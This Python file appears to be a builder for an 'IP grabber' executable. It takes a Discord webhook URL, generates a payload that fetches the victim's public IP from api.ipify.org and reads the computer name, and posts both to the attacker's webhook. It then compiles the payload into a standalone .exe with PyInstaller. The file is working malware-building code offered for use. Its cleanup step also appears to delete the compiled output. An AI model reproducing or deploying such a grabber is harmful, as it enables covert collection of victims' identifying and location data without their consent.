import requests
import dhooks
import colorama
from colorama import init, Fore
import ctypes
import time
import os
import sys
import shutil


os.system('cls')
init(convert=True)


def main():
    os.system('cls')
    print(Fore.LIGHTYELLOW_EX)
    print('    /$$$$$$ /$$$$$$$')
    print('    |_  $$_/| $$__  $$')
    print(f'      | $$  | $$  \ $$     {Fore.YELLOW}Made by {Fore.LIGHTRED_EX}$x {Fore.LIGHTYELLOW_EX}')
    print('      | $$  | $$$$$$$/')
    print('      | $$  | $$____/') 
    print('      | $$  | $$')      
    print('     /$$$$$$| $$')      
    print('    |______/|__/')      
    print('')
    wbh_url = input(f'    {Fore.YELLOW}[{Fore.LIGHTYELLOW_EX}.{Fore.YELLOW}] {Fore.LIGHTYELLOW_EX}Enter your WebHook URL :: {Fore.YELLOW}')
    fh_name = input(f'    {Fore.YELLOW}[{Fore.LIGHTYELLOW_EX}.{Fore.YELLOW}] {Fore.LIGHTYELLOW_EX}Enter your file\'s output name (no space) :: {Fore.YELLOW}')
    print(f'    {Fore.YELLOW}[{Fore.LIGHTYELLOW_EX}.{Fore.YELLOW}] {Fore.LIGHTYELLOW_EX}Creating Main File ... ')   
    
    
    rm = f"""
import requests
import dhooks
import os
import sys
    
r = requests.get('https://api.ipify.org/')
rct = r.text

c = os.getenv('COMPUTERNAME')
    
hook = dhooks.Webhook('{wbh_url}')
hook.send(c + "'s IP: " + rct)


    """
    with open(f"{fh_name}.py", "w") as f:
        f.write(rm)
    
    print(f'    {Fore.YELLOW}[{Fore.LIGHTYELLOW_EX}.{Fore.YELLOW}] {Fore.LIGHTGREEN_EX}Main File Created')
    print(f'    {Fore.YELLOW}[{Fore.LIGHTYELLOW_EX}.{Fore.YELLOW}] {Fore.LIGHTYELLOW_EX}Compiling | Please wait ...')      
        
    os.system('echo off')
    print(Fore.BLACK)   
    os.system(f'pyinstaller --onefile --icon=Ass/Logo.ico {fh_name}.py')
    os.system('cls')
    print(f'    {Fore.YELLOW}[{Fore.LIGHTYELLOW_EX}.{Fore.YELLOW}] {Fore.LIGHTGREEN_EX}Successfuly Compiled')   
    print(f'    {Fore.YELLOW}[{Fore.LIGHTYELLOW_EX}.{Fore.YELLOW}] {Fore.LIGHTYELLOW_EX}Deleting Unused Files/Directory')   
    os.rename(f'dist/{fh_name}.exe',f'{fh_name}') 
    os.remove(f"{fh_name}.spec")
    os.remove(f"{fh_name}")
    os.rmdir("dist")
    shutil.rmtree("__pycache__")
    shutil.rmtree("build")
    print(f'    {Fore.YELLOW}[{Fore.LIGHTYELLOW_EX}.{Fore.YELLOW}] {Fore.LIGHTGREEN_EX}Successfuly Deleted Unused Files/Directory')   
    print('')
    print(f'    {Fore.YELLOW}[{Fore.LIGHTYELLOW_EX}.{Fore.YELLOW}] {Fore.LIGHTGREEN_EX}Grabber Successfuly Created')   
    time.sleep(2)
    
main()
time.sleep(100)